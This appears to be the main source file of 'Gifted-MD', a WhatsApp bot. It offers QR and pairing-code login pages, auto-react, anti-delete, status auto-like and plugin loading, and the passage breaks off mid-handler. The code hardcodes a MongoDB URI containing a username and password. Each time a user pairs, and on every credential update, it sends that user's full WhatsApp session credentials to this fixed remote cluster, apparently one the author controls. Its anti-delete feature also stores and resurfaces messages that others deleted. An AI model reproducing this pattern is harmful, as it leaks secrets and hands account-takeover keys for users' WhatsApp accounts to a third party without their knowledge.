const { 
    default: giftedConnect, 
    isJidGroup, 
    jidNormalizedUser,
    isJidBroadcast,
    downloadMediaMessage, 
    downloadContentFromMessage,
    downloadAndSaveMediaMessage, 
    DisconnectReason, 
    getContentType,
    fetchLatestWaWebVersion, 
    useMultiFileAuthState, 
    makeCacheableSignalKeyStore,
    jidDecode,
    Browsers,
    delay
} = require("gifted-baileys");

const { 
    evt, 
    logger,
    emojis,
    gmdStore,
    commands,
    setSudo,
    delSudo,
    GiftedTechApi,
    GiftedApiKey,
    GiftedAutoReact,
    GiftedAntiLink,
    GiftedAutoBio,
    GiftedChatBot,
    loadSession,
    getMediaBuffer,
    getSudoNumbers,
    getFileContentType,
    bufferToStream,
    uploadToPixhost,
    uploadToImgBB,
    setCommitHash, 
    getCommitHash,
    gmdBuffer, gmdJson, 
    formatAudio, formatVideo,
    uploadToGithubCdn,
    uploadToGiftedCdn,
    uploadToPasteboard,
    uploadToCatbox,
    GiftedAnticall,
    createContext, 
    createContext2,
    verifyJidState,
    GiftedPresence,
    GiftedAntiDelete
} = require("./gift");

const { 
    Sticker, 
    createSticker, 
    StickerTypes 
} = require("wa-sticker-formatter");
const pino = require("pino");
const config = require("./config");
const axios = require("axios");
const googleTTS = require("google-tts-api");
const fs = require("fs-extra");
const path = require("path");
const { Boom } = require("@hapi/boom");
const express = require("express");
const QRCode = require('qrcode');
const { MongoClient } = require('mongodb');
const { promisify } = require('util');
const stream = require('stream');
const pipeline = promisify(stream.pipeline);
const { sendButtons } = require('gifted-btns');

const {
    MODE: botMode, 
    BOT_PIC: botPic, 
    FOOTER: botFooter, 
    CAPTION: botCaption, 
    VERSION: botVersion, 
    OWNER_NUMBER: ownerNumber, 
    OWNER_NAME: ownerName,  
    BOT_NAME: botName, 
    PREFIX: botPrefix,
    PRESENCE: botPresence,
    CHATBOT: chatBot,
    CHATBOT_MODE: chatBotMode,
    STARTING_MESSAGE: startMess,
    ANTIDELETE: antiDelete,
    ANTILINK: antiLink,
    ANTICALL: antiCall,
    TIME_ZONE: timeZone,
    BOT_REPO: giftedRepo,
    NEWSLETTER_JID: newsletterJid,
    NEWSLETTER_URL: newsletterUrl,
    AUTO_REACT: autoReact,
    AUTO_READ_STATUS: autoReadStatus,
    AUTO_LIKE_STATUS: autoLikeStatus,
    STATUS_LIKE_EMOJIS: statusLikeEmojis,
    AUTO_REPLY_STATUS: autoReplyStatus,
    STATUS_REPLY_TEXT: statusReplyText,
    AUTO_READ_MESSAGES: autoRead,
    AUTO_BLOCK: autoBlock,
    AUTO_BIO: autoBio } = config;

// Initialize Express App
const app = express();
const PORT = process.env.PORT || 10000;
const WEB_PORT = process.env.WEB_PORT || 10000;

let Gifted;
logger.level = "silent";

// MongoDB Configuration
const MONGODB_URI = "mongodb+srv://ellyongiro8:QwXDXE6tyrGpUTNb@cluster0.tyxcmm9.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const DB_NAME = "gifted_md";
const SESSIONS_COLLECTION = "sessions";

// Middleware
app.use(express.static("gift"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB Session Manager
class MongoSessionManager {
    constructor() {
        this.client = null;
        this.db = null;
        this.sessions = null;
        this.connected = false;
    }
    
    async connect() {
        try {
            this.client = new MongoClient(MONGODB_URI, {
                serverSelectionTimeoutMS: 10000,
                socketTimeoutMS: 45000,
                connectTimeoutMS: 10000,
                maxPoolSize: 10,
                minPoolSize: 1
            });
            
            await this.client.connect();
            this.db = this.client.db(DB_NAME);
            this.sessions = this.db.collection(SESSIONS_COLLECTION);
            this.connected = true;
            
            console.log("✅ MongoDB connected successfully");
            
            // Create index for faster lookups
            await this.sessions.createIndex({ phoneNumber: 1 }, { unique: true });
            await this.sessions.createIndex({ sessionId: 1 }, { unique: true });
            await this.sessions.createIndex({ createdAt: 1 }, { expireAfterSeconds: 86400 * 30 }); // Auto expire after 30 days
            
            return true;
        } catch (error) {
            console.error("❌ MongoDB connection error:", error.message);
            this.connected = false;
            
            // Fallback to local file storage
            console.log("⚠️ Falling back to local session storage");
            return false;
        }
    }
    
    async disconnect() {
        if (this.client) {
            await this.client.close();
            this.connected = false;
            console.log("📴 MongoDB disconnected");
        }
    }
    
    async hasActiveSession(phoneNumber = null) {
        try {
            if (!this.connected) {
                // Fallback to local file check
                const sessionDir = path.join(__dirname, "gift", "session");
                const sessionFile = path.join(sessionDir, "creds.json");
                return fs.existsSync(sessionFile);
            }
            
            const query = phoneNumber 
                ? { phoneNumber } 
                : { isActive: true };
            
            const session = await this.sessions.findOne(query, { sort: { createdAt: -1 } });
            return !!session;
        } catch (error) {
            console.error("Error checking active session:", error);
            return false;
        }
    }
    
    async getSessionData(phoneNumber = null) {
        try {
            if (!this.connected) {
                // Fallback to local file
                const sessionDir = path.join(__dirname, "gift", "session");
                const sessionFile = path.join(sessionDir, "creds.json");
                
                if (!fs.existsSync(sessionFile)) {
                    return null;
                }
                
                const sessionData = fs.readFileSync(sessionFile, 'utf8');
                return JSON.parse(sessionData);
            }
            
            const query = phoneNumber 
                ? { phoneNumber } 
                : { isActive: true };
            
            const session = await this.sessions.findOne(query, { sort: { createdAt: -1 } });
            return session ? session.creds : null;
        } catch (error) {
            console.error("Error getting session data:", error);
            return null;
        }
    }
    
    async saveSessionData(creds, phoneNumber = null) {
        try {
            // Always save locally as backup
            const sessionDir = path.join(__dirname, "gift", "session");
            fs.ensureDirSync(sessionDir);
            const sessionFile = path.join(sessionDir, "creds.json");
            fs.writeFileSync(sessionFile, JSON.stringify(creds, null, 2));
            
            if (!this.connected) {
                console.log("⚠️ Saved session locally (MongoDB not connected)");
                return true;
            }
            
            // Extract phone number from creds if not provided
            let extractedPhone = phoneNumber;
            if (!extractedPhone && creds.me && creds.me.id) {
                extractedPhone = creds.me.id.split(':')[0] || creds.me.id.split('@')[0];
            }
            
            // Generate session ID
            const sessionId = this.generateSessionId();
            
            // Deactivate all previous sessions for this phone
            if (extractedPhone) {
                await this.sessions.updateMany(
                    { phoneNumber: extractedPhone },
                    { $set: { isActive: false, updatedAt: new Date() } }
                );
            }
            
            // Save new session
            const sessionDoc = {
                sessionId,
                phoneNumber: extractedPhone,
                creds,
                isActive: true,
                deviceInfo: {
                    platform: process.platform,
                    version: process.version,
                    userAgent: 'Gifted-MD/1.0'
                },
                createdAt: new Date(),
                updatedAt: new Date(),
                lastActivity: new Date()
            };
            
            await this.sessions.insertOne(sessionDoc);
            console.log(`✅ Session saved to MongoDB for: ${extractedPhone || 'Unknown'}`);
            
            return sessionId;
        } catch (error) {
            console.error("Error saving session to MongoDB:", error);
            // Still successful if saved locally
            return "local-session";
        }
    }
    
    async clearSession(phoneNumber = null) {
        try {
            // Clear local file
            const sessionDir = path.join(__dirname, "gift", "session");
            const sessionFile = path.join(sessionDir, "creds.json");
            if (fs.existsSync(sessionFile)) {
                fs.removeSync(sessionFile);
            }
            
            if (!this.connected) {
                console.log("⚠️ Cleared local session (MongoDB not connected)");
                return true;
            }
            
            if (phoneNumber) {
                await this.sessions.updateMany(
                    { phoneNumber },
                    { $set: { isActive: false, updatedAt: new Date() } }
                );
                console.log(`✅ Session deactivated for: ${phoneNumber}`);
            } else {
                await this.sessions.updateMany(
                    { isActive: true },
                    { $set: { isActive: false, updatedAt: new Date() } }
                );
                console.log("✅ All sessions deactivated");
            }
            
            return true;
        } catch (error) {
            console.error("Error clearing session:", error);
            return false;
        }
    }
    
    async updateLastActivity(phoneNumber) {
        if (!this.connected) return;
        
        try {
            await this.sessions.updateOne(
                { phoneNumber, isActive: true },
                { $set: { lastActivity: new Date() } }
            );
        } catch (error) {
            console.error("Error updating last activity:", error);
        }
    }
    
    generateSessionId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < 8; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return `PRINCE-MDX~${result}`;
    }
    
    getRandomId(length = 4) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
}

// Initialize session manager
const sessionManager = new MongoSessionManager();

// Global variables
let store; 
let reconnectAttempts = 0;
let botStarted = false;
const MAX_RECONNECT_ATTEMPTS = 50;
const RECONNECT_DELAY = 5000;

// WEB ROUTES FOR SESSION GENERATION

// Main page
app.get("/", (req, res) => {
    const sessionExists = fs.existsSync(path.join(__dirname, "gift", "session", "creds.json"));
    
    if (sessionExists) {
        res.sendFile(__dirname + "/gift/gifted.html");
    } else {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Gifted-MD Setup</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; background: #121212; color: white; }
                    .container { max-width: 500px; margin: 0 auto; }
                    h1 { color: #6e48aa; margin-bottom: 30px; }
                    .option { margin: 30px 0; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 10px; }
                    button { background: #6e48aa; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
                    input { padding: 12px; margin: 10px; width: 250px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; }
                    .status { margin: 20px; padding: 15px; border-radius: 8px; display: none; }
                    .status.success { background: rgba(0,255,0,0.1); color: #0f0; }
                    .status.info { background: rgba(0,150,255,0.1); color: #09f; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🤖 Gifted-MD WhatsApp Setup</h1>
                    <p>No session found. Please create one:</p>
                    
                    <div class="option">
                        <h2>Option 1: QR Code</h2>
                        <p>Scan QR code with WhatsApp > Linked Devices</p>
                        <button onclick="window.location.href='/qr'">Generate QR Code</button>
                    </div>
                    
                    <div class="option">
                        <h2>Option 2: Pairing Code</h2>
                        <p>Enter your WhatsApp number with country code</p>
                        <input type="text" id="phone" placeholder="254712345678">
                        <button onclick="pair()">Get Pairing Code</button>
                    </div>
                    
                    <div id="result"></div>
                    <div class="status" id="status"></div>
                </div>
                
                <script>
                    function pair() {
                        const phone = document.getElementById('phone').value.trim();
                        if (!phone) {
                            alert('Please enter phone number');
                            return;
                        }
                        window.location.href = '/pair?number=' + phone;
                    }
                    
                    // Auto-check for session creation
                    setInterval(() => {
                        fetch('/status')
                            .then(res => res.json())
                            .then(data => {
                                if (data.bot === "Connected") {
                                    document.getElementById('status').className = 'status success';
                                    document.getElementById('status').style.display = 'block';
                                    document.getElementById('status').innerHTML = 
                                        '✅ Bot Connected Successfully!<br>Your WhatsApp is now linked.';
                                    
                                    // Redirect to main page after 3 seconds
                                    setTimeout(() => {
                                        window.location.href = '/';
                                    }, 3000);
                                }
                            });
                    }, 5000);
                </script>
            </body>
            </html>
        `);
    }
});

// QR Code Route
app.get('/qr', async (req, res) => {
    const sessionId = sessionManager.getRandomId();
    const tempSessionDir = path.join(__dirname, "gift", "session", 'temp_' + sessionId);
    
    try {
        const { version } = await fetchLatestWaWebVersion();
        const { state, saveCreds } = await useMultiFileAuthState(tempSessionDir);
        
        let qrSent = false;
        
        const tempGifted = giftedConnect({
            version,
            logger: pino({ level: "silent" }),
            browser: Browsers.macOS("Desktop"),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger)
            },
            printQRInTerminal: false,
            connectTimeoutMs: 60000
        });
        
        tempGifted.ev.on('creds.update', saveCreds);
        
        tempGifted.ev.on("connection.update", async (update) => {
            const { connection, qr } = update;
            
            if (qr && !qrSent) {
                qrSent = true;
                const qrImage = await QRCode.toDataURL(qr);
                res.send(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>GIFTED-MD | QR CODE</title>
                        <style>
                            body { text-align: center; padding: 50px; font-family: Arial; background: #121212; color: white; }
                            .container { max-width: 400px; margin: 0 auto; }
                            .qr-code { width: 300px; height: 300px; margin: 20px auto; padding: 10px; background: white; border-radius: 10px; }
                            .qr-code img { width: 100%; height: 100%; }
                            h1 { color: #6e48aa; }
                            a { color: #6e48aa; text-decoration: none; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>Scan QR Code</h1>
                            <div class="qr-code">
                                <img src="${qrImage}" alt="QR Code"/>
                            </div>
                            <p>Scan with WhatsApp > Linked Devices</p>
                            <p><a href="/">Back to Home</a></p>
                        </div>
                    </body>
                    </html>
                `);
            }
            
            if (connection === "open") {
                console.log("✅ User connected via QR");
                
                // Wait for session to be ready
                await delay(5000);
                
                // Read session data
                const credsPath = path.join(tempSessionDir, "creds.json");
                if (fs.existsSync(credsPath)) {
                    const sessionData = fs.readFileSync(credsPath);
                    const creds = JSON.parse(sessionData);
                    
                    // Save to MongoDB
                    const phoneNumber = tempGifted.user?.id?.split(':')[0] || 'Unknown';
                    const savedSessionId = await sessionManager.saveSessionData(creds, phoneNumber);
                    
                    // Send success message to user
                    const finalSessionId = sessionManager.generateSessionId();
                    
                    const successMsg = `✅ *WhatsApp Successfully Connected!*\n\n` +
                                     `Your Session ID: \`${finalSessionId}\`\n` +
                                     `Phone: ${phoneNumber}\n` +
                                     `Storage: ${sessionManager.connected ? 'MongoDB' : 'Local'}\n\n` +
                                     `🤖 *Gifted-MD is now ready!*\n` +
                                     `Type \`.menu\` to see available commands.\n` +
                                     `Type \`.help\` for assistance.\n\n` +
                                     `> Powered by Gifted Tech`;
                    
                    await tempGifted.sendMessage(tempGifted.user.id, { 
                        text: successMsg 
                    });
                    
                    console.log(`✅ Session saved for: ${phoneNumber}`);
                    
                    // Close temporary connection
                    await tempGifted.ws.close();
                    
                    // Remove temp directory
                    fs.removeSync(tempSessionDir);
                    
                    // Restart main bot with new session
                    if (global.restartBot) {
                        global.restartBot();
                    } else {
                        console.log("⚠️ Bot restart function not available");
                    }
                }
            }
        });
        
        // Timeout after 3 minutes
        setTimeout(() => {
            if (!qrSent) {
                res.send("QR generation timeout. Please try again.");
                if (tempGifted.ws) tempGifted.ws.close();
                fs.removeSync(tempSessionDir);
            }
        }, 180000);
        
    } catch (error) {
        console.error("QR generation error:", error);
        res.status(500).send("Error generating QR code");
    }
});

// Pairing Code Route
app.get('/pair', async (req, res) => {
    const { number } = req.query;
    
    if (!number) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial; padding: 50px; text-align: center; }
                    .error { color: red; }
                </style>
            </head>
            <body>
                <div class="error">Phone number required</div>
                <p><a href="/">Back to Home</a></p>
            </body>
            </html>
        `);
    }
    
    const sessionId = sessionManager.getRandomId();
    const tempSessionDir = path.join(__dirname, "gift", "session", 'temp_' + sessionId);
    
    try {
        const { version } = await fetchLatestWaWebVersion();
        const { state, saveCreds } = await useMultiFileAuthState(tempSessionDir);
        
        const tempGifted = giftedConnect({
            version,
            logger: pino({ level: "silent" }),
            browser: Browsers.macOS("Safari"),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger)
            },
            connectTimeoutMs: 60000
        });
        
        tempGifted.ev.on('creds.update', saveCreds);
        
        if (!tempGifted.authState.creds.registered) {
            await delay(1500);
            const cleanNumber = number.replace(/[^0-9]/g, '');
            
            // Generate pairing code
            const code = await tempGifted.requestPairingCode(cleanNumber);
            
            res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Pairing Code</title>
                    <style>
                        body { font-family: Arial; padding: 50px; text-align: center; background: #121212; color: white; }
                        .code { font-size: 24px; letter-spacing: 2px; background: #222; padding: 20px; border-radius: 10px; margin: 20px auto; max-width: 300px; }
                        .steps { text-align: left; max-width: 400px; margin: 0 auto; }
                        a { color: #6e48aa; }
                    </style>
                </head>
                <body>
                    <h1>Pairing Code Generated</h1>
                    <p>Enter this code in WhatsApp:</p>
                    <div class="code">${code.match(/.{1,4}/g).join('-')}</div>
                    <div class="steps">
                        <p><strong>Steps:</strong></p>
                        <ol>
                            <li>Open WhatsApp on your phone</li>
                            <li>Go to Settings → Linked Devices → Link a Device</li>
                            <li>Enter the code above</li>
                            <li>Wait for connection confirmation</li>
                        </ol>
                    </div>
                    <p><a href="/">Back to Home</a></p>
                    <div id="status" style="margin-top: 20px;"></div>
                </body>
                <script>
                    // Auto-check for connection
                    setInterval(() => {
                        fetch('/status')
                            .then(res => res.json())
                            .then(data => {
                                if (data.bot === "Connected") {
                                    document.getElementById('status').innerHTML = 
                                        '<div style="color: green; font-weight: bold;">✅ Connected! Redirecting...</div>';
                                    
                                    setTimeout(() => {
                                        window.location.href = '/';
                                    }, 2000);
                                }
                            });
                    }, 5000);
                </script>
                </html>
            `);
            
            // Listen for connection
            tempGifted.ev.on("connection.update", async (update) => {
                if (update.connection === "open") {
                    console.log("✅ User connected via pairing code");
                    
                    await delay(5000);
                    
                    // Read session data
                    const credsPath = path.join(tempSessionDir, "creds.json");
                    if (fs.existsSync(credsPath)) {
                        const sessionData = fs.readFileSync(credsPath);
                        const creds = JSON.parse(sessionData);
                        
                        // Save to MongoDB
                        const phoneNumber = tempGifted.user?.id?.split(':')[0] || cleanNumber;
                        await sessionManager.saveSessionData(creds, phoneNumber);
                        
                        // Send success message
                        const finalSessionId = sessionManager.generateSessionId();
                        
                        const successMsg = `✅ *WhatsApp Paired Successfully!*\n\n` +
                                         `Your Session ID: \`${finalSessionId}\`\n` +
                                         `Phone: ${phoneNumber}\n` +
                                         `Storage: ${sessionManager.connected ? 'MongoDB' : 'Local'}\n\n` +
                                         `🤖 *Gifted-MD is now ready!*\n` +
                                         `Type \`.menu\` to see available commands.`;
                        
                        await tempGifted.sendMessage(tempGifted.user.id, { text: successMsg });
                        
                        // Close temporary connection
                        await tempGifted.ws.close();
                        
                        // Remove temp directory
                        fs.removeSync(tempSessionDir);
                        
                        // Restart main bot
                        if (global.restartBot) {
                            global.restartBot();
                        }
                    }
                }
            });
        }
        
    } catch (error) {
        console.error("Pairing error:", error);
        res.send(`
            <!DOCTYPE html>
            <html>
            <body>
                <div style="color: red; text-align: center; padding: 50px;">
                    <h1>Error</h1>
                    <p>Failed to generate pairing code: ${error.message}</p>
                    <p><a href="/">Try Again</a></p>
                </div>
            </body>
            </html>
        `);
    }
});

// Status endpoint
app.get('/status', (req, res) => {
    const sessionFile = path.join(__dirname, "gift", "session", "creds.json");
    const sessionExists = fs.existsSync(sessionFile);
    const status = {
        bot: Gifted ? "Connected" : (sessionExists ? "Ready to Connect" : "Setup Mode"),
        session: sessionExists ? "Active" : "None",
        mongo: sessionManager.connected ? "Connected" : "Disconnected",
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    };
    res.json(status);
});

// Start web server
app.listen(PORT, () => {
    console.log(`🚀 Gifted-MD running on http://localhost:${PORT}`);
    console.log(`📱 QR Code: http://localhost:${PORT}/qr`);
    console.log(`🔗 Pairing: http://localhost:${PORT}/pair?number=YOUR_NUMBER`);
});

// Global restart function
global.restartBot = function() {
    console.log("🔄 Restarting WhatsApp bot with new session...");
    
    if (Gifted && Gifted.ws) {
        Gifted.ws.close();
    }
    
    setTimeout(() => {
        startGifted().catch(err => {
            console.error("Restart error:", err);
            reconnectWithRetry();
        });
    }, 3000);
};

// NEW INITIALIZATION FUNCTION
async function initializeBot() {
    try {
        console.log("🤖 Initializing Gifted-MD...");
        
        // Connect to MongoDB first
        console.log("📊 Connecting to MongoDB...");
        await sessionManager.connect();
        
        // Check if we have an active session
        const hasSession = await sessionManager.hasActiveSession();
        
        if (hasSession) {
            console.log("✅ Found existing session, loading...");
            
            // Try to load the session
            try {
                const sessionData = await sessionManager.getSessionData();
                if (sessionData && sessionData.me && sessionData.me.id) {
                    const phoneNumber = sessionData.me.id.split('@')[0];
                    console.log(`📱 Session loaded for: ${phoneNumber}`);
                }
                
                // Start the bot
                console.log("🚀 Starting WhatsApp bot...");
                startGifted().catch(err => {
                    console.error("Bot startup error:", err);
                    reconnectWithRetry();
                });
                
            } catch (sessionError) {
                console.error("Session load error:", sessionError);
                console.log("📱 Starting in setup mode...");
            }
            
        } else {
            console.log("📱 No session found. Starting in setup mode...");
            console.log("💡 Users can visit:");
            console.log(`   - http://localhost:${PORT}/qr (QR Code)`);
            console.log(`   - http://localhost:${PORT}/pair?number=YOUR_NUMBER (Pairing Code)`);
            console.log("📢 Bot will start automatically when user pairs their WhatsApp");
        }
        
    } catch (error) {
        console.error("Initialization error:", error);
    }
}

// Your existing startGifted function with commands from second code
async function startGifted() {
    try {
        // First check if we have session data
        const sessionDir = path.join(__dirname, "gift", "session");
        const sessionFile = path.join(sessionDir, "creds.json");
        
        if (!fs.existsSync(sessionFile)) {
            console.log("❌ No session file found. Please scan QR code first.");
            return;
        }
        
        const { version, isLatest } = await fetchLatestWaWebVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        if (store) {
            store.destroy();
        }
        store = new gmdStore();
        
        const giftedSock = {
            version,
            logger: pino({ level: "silent" }),
            browser: ['GIFTED', "safari", "1.0.0"],
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger)
            },
            getMessage: async (key) => {
                if (store) {
                    const msg = store.loadMessage(key.remoteJid, key.id);
                    return msg?.message || undefined;
                }
                return { conversation: 'Error occurred' };
            },
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            syncFullHistory: false,
            generateHighQualityLinkPreview: false,
            patchMessageBeforeSending: (message) => {
                const requiresPatch = !!(
                    message.buttonsMessage ||
                    message.templateMessage ||
                    message.listMessage
                );
                if (requiresPatch) {
                    message = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadataVersion: 2,
                                    deviceListMetadata: {},
                                },
                                ...message,
                            },
                        },
                    };
                }
                return message;
            }
        };

        Gifted = giftedConnect(giftedSock);
        
        store.bind(Gifted.ev);

        Gifted.ev.process(async (events) => {
            if (events['creds.update']) {
                await saveCreds();
                // Also save to MongoDB when creds update
                if (Gifted.user?.id) {
                    const phoneNumber = Gifted.user.id.split(':')[0];
                    await sessionManager.saveSessionData(state.creds, phoneNumber);
                }
            }
        });

        // Check if this is a new session
        if (fs.existsSync(sessionFile)) {
            const sessionData = fs.readFileSync(sessionFile, 'utf8');
            const sessionJson = JSON.parse(sessionData);
            
            // Extract phone number
            let phoneNumber = "Unknown";
            if (sessionJson.me && sessionJson.me.id) {
                phoneNumber = sessionJson.me.id.split('@')[0];
            }
            
            console.log(`🤖 Bot connected for: ${phoneNumber}`);
            
            // Send welcome message for new sessions
            if (Gifted.user && startMess === 'true') {
                setTimeout(async () => {
                    const welcomeMsg = `✅ *Gifted-MD Connected Successfully!*\n\n` +
                                     `Phone: ${phoneNumber}\n` +
                                     `Prefix: ${botPrefix}\n` +
                                     `Mode: ${botMode}\n` +
                                     `Session Storage: ${sessionManager.connected ? 'MongoDB' : 'Local'}\n\n` +
                                     `Type \`.menu\` to see available commands!\n` +
                                     `Type \`.help\` for assistance.\n\n` +
                                     `> ${botFooter}`;
                    
                    await Gifted.sendMessage(Gifted.user.id, { text: welcomeMsg });
                }, 5000);
            }
        }

        // YOUR EXISTING AUTO-REACT CODE
        if (autoReact === "true") {
            Gifted.ev.on('messages.upsert', async (mek) => {
                ms = mek.messages[0];
                try {
                    if (ms.key.fromMe) return;
                    if (!ms.key.fromMe && ms.message) {
                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                        await GiftedAutoReact(randomEmoji, ms, Gifted);
                    }
                } catch (err) {
                    console.error('Error during auto reaction:', err);
                }
            });
        }

        const groupCooldowns = new Map();

        function isGroupSpamming(jid) {
            const now = Date.now();
            const lastTime = groupCooldowns.get(jid) || 0;
            if (now - lastTime < 1500) return true;
            groupCooldowns.set(jid, now);
            return false;
        }
        
        // ANTI-DELETE SYSTEM from your second code
        let giftech = { chats: {} };
        const botJid = `${Gifted.user?.id.split(':')[0]}@s.whatsapp.net`;
        const botOwnerJid = `${Gifted.user?.id.split(':')[0]}@s.whatsapp.net`;

        Gifted.ev.on("messages.upsert", async ({ messages }) => {
            try {
                const ms = messages[0];
                if (!ms?.message) return;

                const { key } = ms;
                if (!key?.remoteJid) return;
                if (key.fromMe) return;
                if (key.remoteJid === 'status@broadcast') return;

                const sender = key.remoteJid || key.senderPn || key.participantPn || key.participant;
                const senderPushName = key.pushName || ms.pushName;

                if (sender === botJid || sender === botOwnerJid || key.fromMe) return;

                if (!giftech.chats[key.remoteJid]) giftech.chats[key.remoteJid] = [];
                giftech.chats[key.remoteJid].push({
                    ...ms,
                    originalSender: sender, 
                    originalPushName: senderPushName,
                    timestamp: Date.now()
                });

                if (giftech.chats[key.remoteJid].length > 50) {
                    giftech.chats[key.remoteJid] = giftech.chats[key.remoteJid].slice(-50);
                }

                if (ms.message?.protocolMessage?.type === 0) {
                    const deletedId = ms.message.protocolMessage.key.id;
                    const deletedMsg = giftech.chats[key.remoteJid].find(m => m.key.id === deletedId);
                    if (!deletedMsg?.message) return;

                    const deleter = key.participantPn || key.participant || key.remoteJid;
                    const deleterPushName = key.pushName || ms.pushName;
                    
                    if (deleter === botJid || deleter === botOwnerJid) return;

                    await GiftedAntiDelete(
                        Gifted, 
                        deletedMsg, 
                        key, 
                        deleter, 
                        deletedMsg.originalSender, 
                        botOwnerJid,
                        deleterPushName,
                        deletedMsg.originalPushName
                    );

                    giftech.chats[key.remoteJid] = giftech.chats[key.remoteJid].filter(m => m.key.id !== deletedId);
                }
            } catch (error) {
                logger.error('Anti-delete system error:', error);
            }
        });

        if (autoBio === 'true') {
            setTimeout(() => GiftedAutoBio(Gifted), 1000);
            setInterval(() => GiftedAutoBio(Gifted), 1000 * 60); // Update every minute 
        }

        Gifted.ev.on("call", async (json) => {
            await GiftedAnticall(json, Gifted);
        });

        Gifted.ev.on("messages.upsert", async ({ messages }) => {
            if (messages && messages.length > 0) {
                await GiftedPresence(Gifted, messages[0].key.remoteJid);
            }
        });

        Gifted.ev.on("connection.update", ({ connection }) => {
            if (connection === "open") {
                logger.info("Connection established - updating presence");
                GiftedPresence(Gifted, "status@broadcast");
            }
        });

        if (chatBot === 'true' || chatBot === 'audio') {
            GiftedChatBot(Gifted, chatBot, chatBotMode, createContext, createContext2, googleTTS);
        }
        
        Gifted.ev.on('messages.upsert', async ({ messages }) => {
            const message = messages[0];
            if (!message?.message || message.key.fromMe) return;
            if (antiLink !== 'false') {
                await GiftedAntiLink(Gifted, message, antiLink);
            }
        });

        Gifted.ev.on('messages.upsert', async (mek) => {
            try {
                mek = mek.messages[0];
                if (!mek || !mek.message) return;

                const fromJid = mek.key.participant || mek.key.remoteJid;
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;

                if (mek.key && mek.key?.remoteJid === "status@broadcast" && isJidBroadcast(mek.key.remoteJid)) {
                    const giftedtech = jidNormalizedUser(Gifted.user.id);

                    if (autoReadStatus === "true") {
                        await Gifted.readMessages([mek.key, giftedtech]);
                    }

                    if (autoLikeStatus === "true" && mek.key.participant) {
                        const emojis = statusLikeEmojis?.split(',') || "💛,❤️,💜,🤍,💙"; 
                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; 
                        await Gifted.sendMessage(
                            mek.key.remoteJid,
                            { react: { key: mek.key, text: randomEmoji } },
                            { statusJidList: [mek.key.participant, giftedtech] }
                        );
                    }

                    if (autoReplyStatus === "true") {
                        if (mek.key.fromMe) return;
                        const customMessage = statusReplyText || '✅ Status Viewed By Gifted-Md';
                        await Gifted.sendMessage(
                            fromJid,
                            { text: customMessage },
                            { quoted: mek }
                        );
                    }
                }
            } catch (error) {
                console.error("Error Processing Actions:", error);
            }
        });

        // Load plugins
        try {
            const pluginsPath = path.join(__dirname, "gifted");
            fs.readdirSync(pluginsPath).forEach((fileName) => {
                if (path.extname(fileName).toLowerCase() === ".js") {
                    try {
                        require(path.join(pluginsPath, fileName));
                    } catch (e) {
                        console.error(`❌ Failed to load ${fileName}: ${e.message}`);
                    }
                }
            });
        } catch (error) {
            console.error("❌ Error reading Taskflow folder:", error.message);
        }

        // MESSAGE HANDLER - All your commands from second code
        Gifted.ev.on("messages.upsert", async ({ messages }) => {
            const ms = messages[0];
            if (!ms?.message || !ms?.key) return;

            function standardizeJid(jid) {
                if (!jid) return '';
                try {
                    jid = typeof jid === 'string' ? jid : 
                        (jid.decodeJid ? jid.decodeJid() : String(jid));
                    jid = jid.split(':')[0].split('/')[0];
                    if (!jid.includes('@')) {
                        jid += '@s.whatsapp.net';
                    } else if (jid.endsWith('@lid')) {
                        return jid.toLowerCase();
                    }
                    return jid.toLowerCase();
                } catch (e) {
                    console.error("JID standardization error:", e);
                    return '';
                }
            }

            const from = standardizeJid(ms.key.remoteJid);
            const botId = standardizeJid(Gifted.user?.id);
            const isGroup = from.endsWith("@g.us");
            let groupInfo = null;
            let groupName = '';
            try {
                groupInfo = isGroup ? await Gifted.groupMetadata(from).catch(() => null) : null;
                groupName = groupInfo?.subject || '';
            } catch (err) {
                console.error("Group metadata error:", err);
            }

            const sendr = ms.key.fromMe 
                ? (Gifted.user.id.split(':')[0] + '@s.whatsapp.net' || Gifted.user.id) 
                : (ms.key.participantPn || ms.key.senderPn || ms.key.participant || ms.key.remoteJid);
            let participants = [];
            let groupAdmins = [];
            let groupSuperAdmins = [];
            let sender = sendr;
            let isBotAdmin = false;
            let isAdmin = false;
            let isSuperAdmin = false;

            if (groupInfo && groupInfo.participants) {
                participants = groupInfo.participants.map(p => p.pn || p.poneNumber || p.id);
                groupAdmins = groupInfo.participants.filter(p => p.admin === 'admin').map(p => p.pn || p.poneNumber || p.id);
                groupSuperAdmins = groupInfo.participants.filter(p => p.admin === 'superadmin').map(p => p.pn || p.poneNumber || p.id);
